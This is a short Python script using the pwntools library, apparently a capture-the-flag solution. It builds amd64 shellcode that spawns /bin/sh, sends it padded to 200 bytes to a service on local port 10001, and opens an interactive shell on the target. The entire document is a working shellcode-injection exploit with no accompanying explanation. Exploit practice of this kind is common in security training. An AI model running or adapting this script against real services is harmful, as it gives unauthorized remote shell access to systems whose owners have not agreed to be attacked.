from pwn import*

context.arch = 'amd64'
shell_code = asm(shellcraft.sh())

p = remote('0.0.0.0', 10001)


p.send(shell_code.ljust(200, b'\0'))

p.interactive()
